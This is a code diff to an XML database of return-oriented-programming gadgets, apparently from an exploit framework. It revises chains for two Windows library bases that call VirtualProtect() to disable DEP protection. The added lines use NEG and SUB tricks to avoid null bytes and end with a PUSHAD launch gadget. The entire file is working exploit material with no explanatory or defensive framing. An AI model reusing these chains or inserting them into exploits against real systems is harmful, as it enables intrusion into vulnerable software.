@@ -7,12 +7,21 @@
 	</compatibility>
 
 	<gadgets base="0x77c10000">
+		<gadget offset="0x0002b860">POP EAX # RETN</gadget>
+		<gadget value="0xFFFFFBFF">0xFFFFFBFF -> ebx</gadget>
+		<gadget offset="0x0000be18">NEG EAX # POP EBP # RETN</gadget>
+		<gadget value="junk">JUNK</gadget>
+		<gadget offset="0x0001362c">POP EBX # RETN</gadget>
+		<gadget offset="0x0004d9bb">Writable location</gadget>
+		<gadget offset="0x0001e071">XCHG EAX, EBX # ADD BYTE [EAX], AL # RETN</gadget>
+		<gadget offset="0x00040d13">POP EDX # RETN</gadget>
+		<gadget value="0xFFFFFFC0">0xFFFFFFC0-> edx</gadget>
+		<gadget offset="0x00048fbc">XCHG EAX, EDX # RETN</gadget>
+		<gadget offset="0x0000be18">NEG EAX # POP EBX # RETN</gadget>
+		<gadget value="junk">JUNK</gadget>
+		<gadget offset="0x00048fbc">XCHG EAX, EDX # RETN</gadget>
 		<gadget offset="0x0002ee15">POP EBP # RETN</gadget>
 		<gadget offset="0x0002ee15">skip 4 bytes</gadget>
-		<gadget offset="0x0003fa1c">POP EBX # RETN</gadget>
-		<gadget value="0x00000400">0x00000400-> ebx</gadget>
-		<gadget offset="0x00040d13">POP EDX # RETN</gadget>
-		<gadget value="0x00000040">0x00000040-> edx</gadget>
 		<gadget offset="0x0002eeef">POP ECX # RETN</gadget>
 		<gadget offset="0x0004d9bb">Writable location</gadget>
 		<gadget offset="0x0001a88c">POP EDI # RETN</gadget>
@@ -33,23 +42,29 @@
 	</compatibility>
 
 	<gadgets base="0x77ba0000">
-		<gadget offset="0x0003eebf">POP EAX # RETN</gadget>
-		<gadget offset="0x00001114">ptr to VirtualProtect()</gadget>
+		<gadget offset="0x00012563">POP EAX # RETN</gadget>
+		<gadget offset="0x00001114">VirtualProtect()</gadget>
 		<gadget offset="0x0001f244">MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN</gadget>
-		<gadget value="junk">Filler</gadget>
+		<gadget value="junk">JUNK</gadget>
 		<gadget offset="0x00010c86">XCHG EAX,ESI # RETN</gadget>
-		<gadget offset="0x00026320">POP EBP # RETN</gadget>
-		<gadget offset="0x00042265">PUSH ESP # RETN</gadget>
-		<gadget offset="0x000385b7">POP EBX # RETN</gadget>
-		<gadget value="0x00000400">0x00000400-> ebx</gadget>
-		<gadget offset="0x0003e4fc">POP EDX # RETN</gadget>
-		<gadget value="0x00000040">0x00000040-> edx</gadget>
-		<gadget offset="0x000330fb">POP ECX # RETN</gadget>
-		<gadget offset="0x0004ff56">Writable location</gadget>
-		<gadget offset="0x00038a92">POP EDI # RETN</gadget>
-		<gadget offset="0x00037d82">RETN (ROP NOP)</gadget>
-		<gadget offset="0x0003eebf">POP EAX # RETN</gadget>
-		<gadget value="nop">nop</gadget>
+		<gadget offset="0x00029801">POP EBP # RETN</gadget>
+		<gadget offset="0x00042265">ptr to 'push esp #  ret'</gadget>
+		<gadget offset="0x00012563">POP EAX # RETN</gadget>
+		<gadget value="0x03C0990F">EAX</gadget>
+		<gadget offset="0x0003d441">SUB EAX, 03c0940f (dwSize, 0x500 -> ebx)</gadget>
+		<gadget offset="0x000148d3">POP EBX, RET</gadget>
+		<gadget offset="0x000521e0">.data</gadget>
+		<gadget offset="0x0001f102">XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN</gadget>
+		<gadget offset="0x0001fc02">POP ECX # RETN</gadget>
+		<gadget offset="0x0004f001">W pointer (lpOldProtect) (-> ecx)</gadget>
+		<gadget offset="0x00038c04">POP EDI # RETN</gadget>
+		<gadget offset="0x00038c05">ROP NOP (-> edi)</gadget>
+		<gadget offset="0x00012563">POP EAX # RETN</gadget>
+		<gadget value="0x03C0944F">EAX</gadget>
+		<gadget offset="0x0003d441">SUB EAX, 03c0940f</gadget>
+		<gadget offset="0x00018285">XCHG EAX,EDX # RETN</gadget>
+		<gadget offset="0x00012563">POP EAX # RETN</gadget>
+		<gadget value="nop">NOP</gadget>
 		<gadget offset="0x00046591">PUSHAD # ADD AL,0EF # RETN</gadget>
 	</gadgets>
 </rop>
